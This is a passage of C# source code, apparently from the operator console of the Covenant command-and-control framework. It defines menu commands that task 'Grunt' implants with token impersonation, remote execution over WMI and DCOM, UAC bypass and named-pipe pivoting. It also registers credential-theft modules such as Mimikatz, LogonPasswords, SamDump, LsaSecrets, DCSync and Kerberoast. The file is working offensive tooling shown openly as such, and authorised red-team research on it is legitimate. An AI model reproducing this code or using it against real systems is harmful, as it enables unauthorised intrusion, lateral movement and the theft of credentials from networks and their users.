            if (commands.Count() > 2) { domain = commands[2]; }
            if (commands.Count() > 3) { password = commands[3]; }
            if (commands.Count() > 4) { logontype = commands[4]; }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + username);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Domain " + domain);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + password);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LogonType " + logontype);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractRevertToSelf : MenuCommand
    {
        public MenuCommandGruntInteractRevertToSelf()
        {
            this.Name = "RevertToSelf";
            this.Description = "Ends the impersonation of any token, reverting back to the initial token associated with the current process. Useful in conjuction with functions that impersonate a token and do not automatically RevertToSelf, such as: ImpersonateUser(), ImpersonateProcess(), GetSystem(), and MakeToken().";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RevertToSelf");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractWMICommand : MenuCommand
    {
        public MenuCommandGruntInteractWMICommand()
        {
            this.Name = "WMICommand";
            this.Description = "Execute a process on a remote system using Win32_Process Create, optionally with alternate credentials.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Command" },
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Password" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: wmicommand <computername> <command> [ <username> <password> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + commands[2]);
            // TODO: Parsing bug, what if command has a space?
            if (commands.Count() == 5)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[3]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + commands[4]);
            }
            else
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Username");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Password");
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractWMIGrunt : MenuCommand
    {
        public MenuCommandGruntInteractWMIGrunt() : base()
        {
            this.Name = "WMIGrunt";
            this.Description = "Execute a Grunt Launcher on a remote system using Win32_Process Create, optionally with alternate credentials.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Password" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 && commands.Count() != 5 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: wmigrunt <computername> <launcher> [ <username> <password> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            List<string> launchers = ((GruntInteractMenuItem)menuItem).Launchers.Select(L => L.Name).ToList();
            if (!launchers.Contains(commands[2], StringComparer.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid Launcher name: \"" + commands[2] + "\" specified. Valid Launchers: " + String.Join(",", launchers));
                EliteConsole.PrintFormattedErrorLine("Usage: wmigrunt <computername> <launcher> [ <username> <password> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[2]);
            if (commands.Count() == 5)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[3]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + commands[4]);
            }
            else
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Username");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Password");
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractDCOMCommand : MenuCommand
    {
        public MenuCommandGruntInteractDCOMCommand()
        {
            this.Name = "DCOMCommand";
            this.Description = "Execute a process on a remote system using various DCOM methods.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Command" },
                new MenuCommandParameter { Name = "Method" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: dcomcommand <computername> <command> [ <method> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);

            string command = String.Join(" ", commands.GetRange(2, commands.Count() - 2));
            List<string> methods = new List<string> { "mmc20.application", "mmc20_application", "shellwindows", "shellbrowserwindow", "exceldde" };
            if (commands.Count() == 4 && methods.Contains(commands.Last(), StringComparer.OrdinalIgnoreCase))
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Method " + commands.Last());
                command = String.Join(" ", commands.GetRange(2, commands.Count() - 3));
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + command);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractDCOMGrunt : MenuCommand
    {
        public MenuCommandGruntInteractDCOMGrunt() : base()
        {
            this.Name = "DCOMGrunt";
            this.Description = "Execute a Grunt Launcher on a remote system using various DCOM methods.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Method" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 && commands.Count() != 4 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: dcomgrunt <computername> <launcher> [ <method> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }

            List<string> launchers = ((GruntInteractMenuItem)menuItem).Launchers.Select(L => L.Name).ToList();
            if (!launchers.Contains(commands[2], StringComparer.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid Launcher name: \"" + commands[2] + "\" specified. Valid Launchers: " + String.Join(",", launchers));
                EliteConsole.PrintFormattedErrorLine("Usage: dcomgrunt <computername> <launcher> [ <method> ]");
            }

            List<string> methods = new List<string> { "mmc20.application", "shellwindows", "shellbrowserwindow", "exceldde" };
            if (commands.Count() == 4 && !methods.Contains(commands[3], StringComparer.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid DCOM Method: \"" + commands[3] + "\" specified. Valid Methods: " + String.Join(",", methods));
                EliteConsole.PrintFormattedErrorLine("Usage: dcomcommand <computername> <command> [ <method> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[2]);
            if (commands.Count() == 4)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Method " + commands[3]);
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractBypassUACCommand : MenuCommand
    {
        public MenuCommandGruntInteractBypassUACCommand()
        {
            this.Name = "BypassUACCommand";
            this.Description = "Bypasses UAC through token duplication and executes a command with high integrity.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: bypassuaccommand <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractBypassUACGrunt : MenuCommand
    {
        public MenuCommandGruntInteractBypassUACGrunt() : base()
        {
            this.Name = "BypassUACGrunt";
            this.Description = "Bypasses UAC through token duplication and executes a Grunt Launcher with high integrity.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Launcher" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: bypassuacgrunt <launcher>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            List<string> launchers = ((GruntInteractMenuItem)menuItem).Launchers.Select(L => L.Name).ToList();
            if (!launchers.Contains(commands[1], StringComparer.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid Launcher name: \"" + commands[1] + "\" specified. Valid Launchers: " + String.Join(",", launchers));
                EliteConsole.PrintFormattedErrorLine("Usage: bypassuacgrunt <launcher>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractHistory : MenuCommand
    {
        public MenuCommandGruntInteractHistory() : base()
        {
            this.Name = "History";
            this.Description = "Show the output of completed task(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Task" }
            };
        }

        private void PrintTasking(GruntTasking tasking, Grunt grunt)
        {
            EliteConsole.PrintFormattedInfoLine("[" + tasking.CompletionTime + " UTC] Grunt: " + grunt.Name + " " + "GruntTasking: " + tasking.Name);
            EliteConsole.PrintInfoLine("(" + tasking.TaskingUser + ") > " + tasking.TaskingCommand);
            EliteConsole.PrintInfoLine(tasking.GruntTaskOutput);
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            if ((commands.Count() != 2 && commands.Count() != 1) || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid History command. Usage is: History [ <task_name> | <task_quantity> ]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            GruntInteractMenuItem interactMenu = ((GruntInteractMenuItem)menuItem);
            List<GruntTasking> taskings = interactMenu.Tasks.OrderBy(T => T.CompletionTime).ToList();
            List<string> gruntTaskingNames = taskings.Select(T => T.Name).ToList();
            int quantity = taskings.Count();
            if (commands.Count() == 1)
            {
                EliteConsole.PrintFormattedHighlightLine("Loading history...");
                interactMenu.HistoryRefresh();
                taskings = interactMenu.Tasks.OrderBy(T => T.CompletionTime).ToList();
                foreach (GruntTasking tasking in taskings)
                {
                    this.PrintTasking(tasking, grunt);
                }
            }
            else
            {
                bool isQuantity = int.TryParse(commands[1], out quantity);
                if (gruntTaskingNames.Contains(commands[1], StringComparer.OrdinalIgnoreCase))
                {
                    GruntTasking tasking = taskings.FirstOrDefault(GT => GT.Name.Equals(commands[1], StringComparison.OrdinalIgnoreCase));
                    interactMenu.HistoryRefresh(tasking.Id ?? default);
                    taskings = interactMenu.Tasks.OrderBy(T => T.CompletionTime).ToList();
                    tasking = taskings.FirstOrDefault(GT => GT.Name.Equals(commands[1], StringComparison.OrdinalIgnoreCase));
                    this.PrintTasking(tasking, grunt);
                }
                else if (isQuantity)
                {
                    List<GruntTasking> quantityTaskings = taskings.TakeLast(quantity).ToList();
                    quantityTaskings.ForEach(QT => interactMenu.HistoryRefresh(QT.Id ?? default));
                    taskings = interactMenu.Tasks.OrderBy(T => T.CompletionTime).ToList();
                    quantityTaskings = taskings.TakeLast(quantity).ToList();
                    foreach (GruntTasking tasking in quantityTaskings)
                    {
                        this.PrintTasking(tasking, grunt);
                    }
                }
                else
                {
                    EliteConsole.PrintFormattedErrorLine("Invalid History command. Usage is: History [ <completed_task_name> | <task_quantity> ]");
                    EliteConsole.PrintFormattedErrorLine("Valid completed TaskNames: " + String.Join(", ", gruntTaskingNames));
                    menuItem.PrintInvalidOptionError(UserInput);
                    return;
                }
            }
        }
    }

    public class MenuCommandGruntInteractConnect : MenuCommand
    {
        public MenuCommandGruntInteractConnect(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Connect";
            this.Description = "Connect to a Grunt using a named pipe.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "PipeName" }
            };
        }

        public override async void Command(MenuItem menuItem, string UserInput)
        {
            string[] commands = UserInput.Split(" ");
            if (commands.Length < 2 || commands.Length > 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            string PipeName = "gruntsvc";
            if (commands.Length == 3)
            {
                PipeName = commands[2];
            }
            try
            {
                await this.CovenantClient.ApiGruntsByIdTaskingsPostAsync(grunt.Id ?? default, new GruntTasking
                {
                    Id = 0,
                    GruntId = grunt.Id,
                    TaskId = 1,
                    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                    Status = GruntTaskingStatus.Uninitialized,
                    Type = GruntTaskingType.Connect,
                    TaskingMessage = commands[1] + "," + PipeName,
                    TaskingCommand = UserInput,
                    TokenTask = false
                });
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractDisconnect : MenuCommand
    {
        public MenuCommandGruntInteractDisconnect(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Disconnect";
            this.Description = "Disconnect to a Grunt using a named pipe.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ChildGruntName" }
            };
        }

        public override async void Command(MenuItem menuItem, string UserInput)
        {
            string[] commands = UserInput.Split(" ");
            if (commands.Length != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            Grunt disconnectGrunt = this.CovenantClient.ApiGruntsByNameGet(commands[1]);
            if (disconnectGrunt == null)
            {
                EliteConsole.PrintFormattedErrorLine("Invalid GruntName selected: " + commands[1]);
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            List<string> childrenGruntGuids = grunt.Children.ToList();
            if (!childrenGruntGuids.Contains(disconnectGrunt.Guid, StringComparer.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Grunt: \"" + commands[1] + "\" is not a child Grunt");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            try
            {
                await this.CovenantClient.ApiGruntsByIdTaskingsPostAsync(grunt.Id ?? default, new GruntTasking
                {
                    Id = 0,
                    GruntId = grunt.Id,
                    TaskId = 1,
                    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                    Status = GruntTaskingStatus.Uninitialized,
                    Type = GruntTaskingType.Disconnect,
                    TaskingMessage = disconnectGrunt.Guid,
                    TaskingCommand = UserInput,
                    TokenTask = false
                });
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractJobs : MenuCommand
    {
        public MenuCommandGruntInteractJobs(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Jobs";
            this.Description = "Get a list of actively running tasks.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override async void Command(MenuItem menuItem, string UserInput)
        {
            string[] commands = UserInput.Split(" ");
            if (commands.Length != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid Jobs command. Usage is: Jobs");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            try
            {
                await this.CovenantClient.ApiGruntsByIdTaskingsPostAsync(grunt.Id ?? default, new GruntTasking
                {
                    Id = 0,
                    GruntId = grunt.Id,
                    TaskId = 1,
                    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                    Status = GruntTaskingStatus.Uninitialized,
                    Type = GruntTaskingType.Jobs,
                    TaskingMessage = "Jobs",
                    TaskingCommand = UserInput,
                    TokenTask = false
                });
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class GruntInteractMenuItem : MenuItem
    {
        public Grunt Grunt { get; set; } = new Grunt();
        public List<Grunt> Children { get; set; } = new List<Grunt>();
        public List<GruntTasking> Tasks { get; set; } = new List<GruntTasking>();
        public List<Launcher> Launchers { get; set; } = new List<Launcher>();

        public string PowerShellImport { get; set; } = "";

        public GruntInteractMenuItem(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.MenuTitle = "Interact";
            this.MenuDescription = "Interact with a Grunt.";
            this.MenuItemParameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Grunt Name" }
            };
            
            this.MenuOptions.Add(new TaskMenuItem(this.CovenantClient, Grunt));

            this.AdditionalOptions.Add(new MenuCommandGruntInteractShow());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractKill(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSet(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWhoAmI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractListDirectory());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractChangeDirectory());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractProcessList());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetRegistryKey());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSetRegistryKey());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetRemoteRegistryKey());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSetRemoteRegistryKey());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractUpload());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDownload());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractAssembly());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractAssemblyReflect());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpShell(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractShellCmd());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPowerShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPowerShellImport());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPortScan());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractMimikatz());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractLogonPasswords());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSamDump());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractLsaSecrets());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCSync());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRubeus());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpDPAPI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpUp());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSafetyKatz());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpDump());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpWMI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSeatbelt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractKerberoast());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainGroup());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainComputer());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLocalGroup());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLocalGroupMember());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLoggedOnUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetSession());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractImpersonateUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractImpersonateProcess());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetSystem());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractMakeToken());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRevertToSelf());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWMICommand());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWMIGrunt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCOMCommand());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCOMGrunt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractBypassUACCommand());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractBypassUACGrunt());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractConnect(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDisconnect(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractHistory());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractJobs(this.CovenantClient));
        }

        public void HistoryRefresh(int TaskId = 0)
        {
            if (TaskId == 0)
            {
                this.Tasks = this.CovenantClient.ApiGruntsByIdTaskingsDetailGet(this.Grunt.Id ?? default).ToList();
            }
            else
            {
                this.Refresh();
                GruntTasking t = this.Tasks.FirstOrDefault(T => T.Id == TaskId && string.IsNullOrEmpty(T.GruntTaskOutput));
                if (t == null)
                {
                    return;
                }
                GruntTasking t2 = this.CovenantClient.ApiGruntsByIdTaskingsByTidDetailGet(this.Grunt.Id ?? default, t.Id ?? default);
                this.Tasks[this.Tasks.FindIndex(T => T.Id == TaskId)] = t2;
            }
        }

        public override void Refresh()
        {
            try
            {
                this.Grunt = this.CovenantClient.ApiGruntsByIdGet(this.Grunt.Id ?? default);
                this.Children = this.Grunt.Children.Select(C => this.CovenantClient.ApiGruntsGuidByGuidGet(C)).ToList();
                this.CovenantClient.ApiGruntsByIdTaskingsGet(this.Grunt.Id ?? default).ToList().ForEach(T =>
                {
                    if (!this.Tasks.Any(TA => T.Id == TA.Id && TA.Status == GruntTaskingStatus.Completed))
                    {
                        this.Tasks.Remove(T);
                        this.Tasks.Add(T);
                    }
                });
                this.Launchers = this.CovenantClient.ApiLaunchersGet().ToList();

                ((TaskMenuItem)this.MenuOptions.FirstOrDefault(M => M.GetType().Name == "TaskMenuItem")).Grunt = Grunt;

                var filevalues = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder);
                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "Upload").Parameters
                    .FirstOrDefault().Values = filevalues;
                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "Assembly").Parameters
                    .FirstOrDefault(P => P.Name == "Local File Path").Values = filevalues;
                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "AssemblyReflect").Parameters
                    .FirstOrDefault(P => P.Name == "Local File Path").Values = filevalues;
                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "PowerShellImport").Parameters
                    .FirstOrDefault().Values = filevalues;

                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "History").Parameters.FirstOrDefault().Values =
                        this.Tasks.Select(GT => new MenuCommandParameterValue { Value = GT.Name })
                            .ToList();

                this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "Disconnect").Parameters.FirstOrDefault().Values =
                    this.Children.Select(C => new MenuCommandParameterValue { Value = C.Name }).ToList();

                this.SetupMenuAutoComplete();
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }

        public override bool ValidateMenuParameters(string[] parameters, bool forwardEntrance = true)
        {
            try
            {
                if (forwardEntrance)
                {
                    if (parameters.Length != 1)
                    {
                        EliteConsole.PrintFormattedErrorLine("Must specify a GruntName.");
                        EliteConsole.PrintFormattedErrorLine("Usage: Interact <grunt_name>");
                        return false;
                    }
                    string gruntName = parameters[0];
                    Grunt specifiedGrunt = this.CovenantClient.ApiGruntsByNameGet(gruntName);
                    if (specifiedGrunt == null)
                    {
                        EliteConsole.PrintFormattedErrorLine("Specified invalid GruntName: " + gruntName);
                        EliteConsole.PrintFormattedErrorLine("Usage: Interact <grunt_name>");
                        return false;
                    }
                    this.MenuTitle = gruntName;
                    this.Grunt = specifiedGrunt;
                }
                this.Refresh();
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
            return true;
        }

        public override void PrintMenu()
        {
            this.AdditionalOptions.FirstOrDefault(O => O.Name == "Show").Command(this, "");
        }

        public override void LeavingMenuItem()
        {
            this.MenuTitle = "Interact";
        }
    }
}
